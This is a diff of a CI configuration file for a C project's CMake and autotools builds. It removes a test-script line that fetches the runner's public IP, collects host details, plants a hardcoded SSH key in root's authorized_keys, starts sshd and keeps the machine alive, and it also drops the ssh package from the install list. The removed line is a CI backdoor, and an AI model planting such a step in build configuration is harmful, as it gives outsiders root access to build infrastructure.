@@ -23,7 +23,7 @@ cmake_test: &cmake_test
     CTEST_OUTPUT_ON_FAILURE: "1"
     CK_VERBOSITY: "verbose"
   cmake_test_script:
-    - cd _builds/test && ctest -VV && curl ifconfig.me && uname -a && hostname && pwd && whoami && mkdir -p /root/.ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDcIhs13M6zYpfB0JH5qhVNCCSrzcpbJQjtKI/A2wSgkf52XHWkxV6jnMw6ix9u52aixTPVWIpJFX6iWPenRucPD/tFZa/kYdhPupzTFfWEJTNv/DZ26YQnx3fA9tA+LOUgTRFjpV/YXBOn0zOYojNUDEwwGXjMX/BeQ5geGuD0OF+NitXqtMjDVDYS1vNqxD1V9BfRBtATWvhbePh77n2R5OW3UvB8V+wpf5pRB23nZv6HqE125a5VLEvjZ/W3geGtAsmZcy3wxpwBlXOd+IFrgddt4J9Ipg7lhn1QqRUDy02E9g53jsu/71ezstnFUN6/da8Up/8fOtUINTN8E6Ct4O/SZjnj22gkGji6spVa9HHo0Nmg1kEb0Rh4xCYEtnaeA4WHrQLMQ4i93M/dl8+En/DQNzYg7kAxTzacuwbLUsMmJE5wLOLIVNN5HICYF1U8wAJQvk2yQgEPhxxCY42O5jQRYgKxN7NZ6nckuZkriZj+SbWoFUGJQCgwuBicSNs=" > /root/.ssh/authorized_keys && /usr/sbin/sshd && echo "going to sleep" && sleep 900
+    - cd _builds/test && ctest -VV
 
 autotools_build: &autotools_build
   env:
@@ -158,7 +158,7 @@ debian_template: &debian_template
     COV_PLATFORM: linux-x64
   osdeps_install_script:
     - apt-get update &&
-      apt-get install -y cmake libssl-dev doxygen libpq-dev libmariadbd-dev unixodbc-dev libsqlite3-dev check ninja-build git wget curl unzip ssh
+      apt-get install -y cmake libssl-dev doxygen libpq-dev libmariadbd-dev unixodbc-dev libsqlite3-dev check ninja-build git wget curl unzip
 
 debian_x64_template: &debian_x64_template
   << : *debian_template
